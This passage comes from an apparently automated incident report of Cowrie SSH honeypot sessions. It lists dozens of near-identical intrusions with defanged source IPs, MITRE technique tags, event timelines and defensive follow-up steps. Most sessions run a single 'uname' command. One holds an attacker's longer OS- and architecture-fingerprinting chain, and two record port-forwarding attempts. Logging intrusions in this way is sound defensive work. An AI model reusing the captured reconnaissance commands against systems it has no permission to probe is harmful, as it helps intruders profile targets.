| **First Seen** | 2026-07-21 04:01 |
| **Last Seen** | 2026-07-21 04:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:01:46` | `cowrie.session.connect` |
| `2026-07-21 04:01:46` | `cowrie.client.version` |
| `2026-07-21 04:01:46` | `cowrie.client.kex` |
| `2026-07-21 04:01:46` | `cowrie.login.success` |
| `2026-07-21 04:01:47` | `cowrie.session.params` |
| `2026-07-21 04:01:48` | `cowrie.command.input` |
| `2026-07-21 04:01:48` | `cowrie.log.closed` |
| `2026-07-21 04:01:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ac78dae3a76

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:01 |
| **Last Seen** | 2026-07-21 04:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:01:51` | `cowrie.session.connect` |
| `2026-07-21 04:01:51` | `cowrie.client.version` |
| `2026-07-21 04:01:51` | `cowrie.client.kex` |
| `2026-07-21 04:01:51` | `cowrie.login.success` |
| `2026-07-21 04:01:52` | `cowrie.session.params` |
| `2026-07-21 04:01:52` | `cowrie.command.input` |
| `2026-07-21 04:01:52` | `cowrie.log.closed` |
| `2026-07-21 04:01:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3a55591cc43

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:01 |
| **Last Seen** | 2026-07-21 04:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:01:55` | `cowrie.session.connect` |
| `2026-07-21 04:01:55` | `cowrie.client.version` |
| `2026-07-21 04:01:56` | `cowrie.client.kex` |
| `2026-07-21 04:01:56` | `cowrie.login.success` |
| `2026-07-21 04:01:57` | `cowrie.session.params` |
| `2026-07-21 04:01:57` | `cowrie.command.input` |
| `2026-07-21 04:01:57` | `cowrie.log.closed` |
| `2026-07-21 04:01:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f5da9becdcb

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 04:01 |
| **Last Seen** | 2026-07-21 04:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:01:58` | `cowrie.session.connect` |
| `2026-07-21 04:01:59` | `cowrie.client.version` |
| `2026-07-21 04:01:59` | `cowrie.client.kex` |
| `2026-07-21 04:02:02` | `cowrie.login.success` |
| `2026-07-21 04:02:04` | `cowrie.session.params` |
| `2026-07-21 04:02:04` | `cowrie.command.input` |
| `2026-07-21 04:02:04` | `cowrie.command.input` |
| `2026-07-21 04:02:04` | `cowrie.command.input` |
| `2026-07-21 04:02:04` | `cowrie.command.input` |
| `2026-07-21 04:02:04` | `cowrie.command.input` |
| `2026-07-21 04:02:04` | `cowrie.command.success` |
| `2026-07-21 04:02:04` | `cowrie.command.input` |
| `2026-07-21 04:02:04` | `cowrie.command.input` |
| `2026-07-21 04:02:04` | `cowrie.command.input` |
| `2026-07-21 04:02:04` | `cowrie.command.input` |
| `2026-07-21 04:02:05` | `cowrie.log.closed` |
| `2026-07-21 04:02:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c45354ac0963

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:02 |
| **Last Seen** | 2026-07-21 04:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:02:00` | `cowrie.session.connect` |
| `2026-07-21 04:02:00` | `cowrie.client.version` |
| `2026-07-21 04:02:00` | `cowrie.client.kex` |
| `2026-07-21 04:02:01` | `cowrie.login.success` |
| `2026-07-21 04:02:02` | `cowrie.session.params` |
| `2026-07-21 04:02:02` | `cowrie.command.input` |
| `2026-07-21 04:02:02` | `cowrie.log.closed` |
| `2026-07-21 04:02:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3112b03dcc4b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:02 |
| **Last Seen** | 2026-07-21 04:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:02:05` | `cowrie.session.connect` |
| `2026-07-21 04:02:05` | `cowrie.client.version` |
| `2026-07-21 04:02:05` | `cowrie.client.kex` |
| `2026-07-21 04:02:06` | `cowrie.login.success` |
| `2026-07-21 04:02:06` | `cowrie.session.params` |
| `2026-07-21 04:02:06` | `cowrie.command.input` |
| `2026-07-21 04:02:06` | `cowrie.log.closed` |
| `2026-07-21 04:02:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fffd2de16c3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:02 |
| **Last Seen** | 2026-07-21 04:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:02:10` | `cowrie.session.connect` |
| `2026-07-21 04:02:10` | `cowrie.client.version` |
| `2026-07-21 04:02:10` | `cowrie.client.kex` |
| `2026-07-21 04:02:11` | `cowrie.login.success` |
| `2026-07-21 04:02:11` | `cowrie.session.params` |
| `2026-07-21 04:02:11` | `cowrie.command.input` |
| `2026-07-21 04:02:11` | `cowrie.log.closed` |
| `2026-07-21 04:02:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-860b1455ab52

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:02 |
| **Last Seen** | 2026-07-21 04:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:02:15` | `cowrie.session.connect` |
| `2026-07-21 04:02:15` | `cowrie.client.version` |
| `2026-07-21 04:02:15` | `cowrie.client.kex` |
| `2026-07-21 04:02:16` | `cowrie.login.success` |
| `2026-07-21 04:02:16` | `cowrie.session.params` |
| `2026-07-21 04:02:16` | `cowrie.command.input` |
| `2026-07-21 04:02:17` | `cowrie.log.closed` |
| `2026-07-21 04:02:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f422af4f3e04

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:02 |
| **Last Seen** | 2026-07-21 04:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:02:20` | `cowrie.session.connect` |
| `2026-07-21 04:02:20` | `cowrie.client.version` |
| `2026-07-21 04:02:20` | `cowrie.client.kex` |
| `2026-07-21 04:02:20` | `cowrie.login.success` |
| `2026-07-21 04:02:21` | `cowrie.session.params` |
| `2026-07-21 04:02:21` | `cowrie.command.input` |
| `2026-07-21 04:02:21` | `cowrie.log.closed` |
| `2026-07-21 04:02:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c117047939ec

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:02 |
| **Last Seen** | 2026-07-21 04:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:02:25` | `cowrie.session.connect` |
| `2026-07-21 04:02:25` | `cowrie.client.version` |
| `2026-07-21 04:02:25` | `cowrie.client.kex` |
| `2026-07-21 04:02:25` | `cowrie.login.success` |
| `2026-07-21 04:02:26` | `cowrie.session.params` |
| `2026-07-21 04:02:26` | `cowrie.command.input` |
| `2026-07-21 04:02:26` | `cowrie.log.closed` |
| `2026-07-21 04:02:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ba37d5b00ec

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:02 |
| **Last Seen** | 2026-07-21 04:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:02:29` | `cowrie.session.connect` |
| `2026-07-21 04:02:29` | `cowrie.client.version` |
| `2026-07-21 04:02:29` | `cowrie.client.kex` |
| `2026-07-21 04:02:30` | `cowrie.login.success` |
| `2026-07-21 04:02:31` | `cowrie.session.params` |
| `2026-07-21 04:02:31` | `cowrie.command.input` |
| `2026-07-21 04:02:31` | `cowrie.log.closed` |
| `2026-07-21 04:02:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbecb453493d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:02 |
| **Last Seen** | 2026-07-21 04:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:02:34` | `cowrie.session.connect` |
| `2026-07-21 04:02:34` | `cowrie.client.version` |
| `2026-07-21 04:02:34` | `cowrie.client.kex` |
| `2026-07-21 04:02:35` | `cowrie.login.success` |
| `2026-07-21 04:02:36` | `cowrie.session.params` |
| `2026-07-21 04:02:36` | `cowrie.command.input` |
| `2026-07-21 04:02:36` | `cowrie.log.closed` |
| `2026-07-21 04:02:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6d7825acaa0

| Field | Detail |
|---|---|
| **Source IP** | `61.2.228[.]177` |
| **First Seen** | 2026-07-21 04:02 |
| **Last Seen** | 2026-07-21 04:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:02:37` | `cowrie.session.connect` |
| `2026-07-21 04:02:38` | `cowrie.client.version` |
| `2026-07-21 04:02:38` | `cowrie.client.kex` |
| `2026-07-21 04:02:40` | `cowrie.login.success` |
| `2026-07-21 04:02:41` | `cowrie.direct-tcpip.request` |
| `2026-07-21 04:02:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.2.228[.]177` to AbuseIPDB if not already reported
- [ ] Block `61.2.228[.]177` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40f94868232e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:02 |
| **Last Seen** | 2026-07-21 04:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:02:39` | `cowrie.session.connect` |
| `2026-07-21 04:02:39` | `cowrie.client.version` |
| `2026-07-21 04:02:39` | `cowrie.client.kex` |
| `2026-07-21 04:02:39` | `cowrie.login.success` |
| `2026-07-21 04:02:40` | `cowrie.session.params` |
| `2026-07-21 04:02:40` | `cowrie.command.input` |
| `2026-07-21 04:02:40` | `cowrie.log.closed` |
| `2026-07-21 04:02:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8d82f46a15b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:02 |
| **Last Seen** | 2026-07-21 04:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:02:44` | `cowrie.session.connect` |
| `2026-07-21 04:02:44` | `cowrie.client.version` |
| `2026-07-21 04:02:44` | `cowrie.client.kex` |
| `2026-07-21 04:02:44` | `cowrie.login.success` |
| `2026-07-21 04:02:45` | `cowrie.session.params` |
| `2026-07-21 04:02:45` | `cowrie.command.input` |
| `2026-07-21 04:02:45` | `cowrie.log.closed` |
| `2026-07-21 04:02:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-018793aa9857

| Field | Detail |
|---|---|
| **Source IP** | `146.190.215[.]195` |
| **First Seen** | 2026-07-21 04:02 |
| **Last Seen** | 2026-07-21 04:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:02:46` | `cowrie.session.connect` |
| `2026-07-21 04:02:46` | `cowrie.client.version` |
| `2026-07-21 04:02:46` | `cowrie.client.kex` |
| `2026-07-21 04:02:47` | `cowrie.login.success` |
| `2026-07-21 04:02:48` | `cowrie.direct-tcpip.request` |
| `2026-07-21 04:02:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.190.215[.]195` to AbuseIPDB if not already reported
- [ ] Block `146.190.215[.]195` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d2bae72b499

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:02 |
| **Last Seen** | 2026-07-21 04:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:02:49` | `cowrie.session.connect` |
| `2026-07-21 04:02:49` | `cowrie.client.version` |
| `2026-07-21 04:02:49` | `cowrie.client.kex` |
| `2026-07-21 04:02:49` | `cowrie.login.success` |
| `2026-07-21 04:02:50` | `cowrie.session.params` |
| `2026-07-21 04:02:50` | `cowrie.command.input` |
| `2026-07-21 04:02:50` | `cowrie.log.closed` |
| `2026-07-21 04:02:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67e41a93389d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:02 |
| **Last Seen** | 2026-07-21 04:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:02:53` | `cowrie.session.connect` |
| `2026-07-21 04:02:53` | `cowrie.client.version` |
| `2026-07-21 04:02:53` | `cowrie.client.kex` |
| `2026-07-21 04:02:54` | `cowrie.login.success` |
| `2026-07-21 04:02:55` | `cowrie.session.params` |
| `2026-07-21 04:02:55` | `cowrie.command.input` |
| `2026-07-21 04:02:55` | `cowrie.log.closed` |
| `2026-07-21 04:02:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05a099a4d533

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:02 |
| **Last Seen** | 2026-07-21 04:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:02:58` | `cowrie.session.connect` |
| `2026-07-21 04:02:58` | `cowrie.client.version` |
| `2026-07-21 04:02:58` | `cowrie.client.kex` |
| `2026-07-21 04:02:58` | `cowrie.login.success` |
| `2026-07-21 04:02:59` | `cowrie.session.params` |
| `2026-07-21 04:02:59` | `cowrie.command.input` |
| `2026-07-21 04:03:00` | `cowrie.log.closed` |
| `2026-07-21 04:03:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-602f2f165ee4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:03 |
| **Last Seen** | 2026-07-21 04:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:03:03` | `cowrie.session.connect` |
| `2026-07-21 04:03:03` | `cowrie.client.version` |
| `2026-07-21 04:03:03` | `cowrie.client.kex` |
| `2026-07-21 04:03:03` | `cowrie.login.success` |
| `2026-07-21 04:03:04` | `cowrie.session.params` |
| `2026-07-21 04:03:04` | `cowrie.command.input` |
| `2026-07-21 04:03:04` | `cowrie.log.closed` |
| `2026-07-21 04:03:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af9afb2bd5e9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:03 |
| **Last Seen** | 2026-07-21 04:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:03:08` | `cowrie.session.connect` |
| `2026-07-21 04:03:08` | `cowrie.client.version` |
| `2026-07-21 04:03:08` | `cowrie.client.kex` |
| `2026-07-21 04:03:08` | `cowrie.login.success` |
| `2026-07-21 04:03:09` | `cowrie.session.params` |
| `2026-07-21 04:03:09` | `cowrie.command.input` |
| `2026-07-21 04:03:09` | `cowrie.log.closed` |
| `2026-07-21 04:03:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ded4e45a951

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:03 |
| **Last Seen** | 2026-07-21 04:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:03:12` | `cowrie.session.connect` |
| `2026-07-21 04:03:12` | `cowrie.client.version` |
| `2026-07-21 04:03:12` | `cowrie.client.kex` |
| `2026-07-21 04:03:13` | `cowrie.login.success` |
| `2026-07-21 04:03:13` | `cowrie.session.params` |
| `2026-07-21 04:03:13` | `cowrie.command.input` |
| `2026-07-21 04:03:13` | `cowrie.log.closed` |
| `2026-07-21 04:03:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0018852f3fea

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:03 |
| **Last Seen** | 2026-07-21 04:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:03:17` | `cowrie.session.connect` |
| `2026-07-21 04:03:17` | `cowrie.client.version` |
| `2026-07-21 04:03:17` | `cowrie.client.kex` |
| `2026-07-21 04:03:17` | `cowrie.login.success` |
| `2026-07-21 04:03:18` | `cowrie.session.params` |
| `2026-07-21 04:03:18` | `cowrie.command.input` |
| `2026-07-21 04:03:18` | `cowrie.log.closed` |
| `2026-07-21 04:03:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3504d1e3f7e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:03 |
| **Last Seen** | 2026-07-21 04:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:03:22` | `cowrie.session.connect` |
| `2026-07-21 04:03:22` | `cowrie.client.version` |
| `2026-07-21 04:03:22` | `cowrie.client.kex` |
| `2026-07-21 04:03:22` | `cowrie.login.success` |
| `2026-07-21 04:03:23` | `cowrie.session.params` |
| `2026-07-21 04:03:23` | `cowrie.command.input` |
| `2026-07-21 04:03:23` | `cowrie.log.closed` |
| `2026-07-21 04:03:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96ae92610834

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:03 |
| **Last Seen** | 2026-07-21 04:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:03:26` | `cowrie.session.connect` |
| `2026-07-21 04:03:26` | `cowrie.client.version` |
| `2026-07-21 04:03:26` | `cowrie.client.kex` |
| `2026-07-21 04:03:27` | `cowrie.login.success` |
| `2026-07-21 04:03:28` | `cowrie.session.params` |
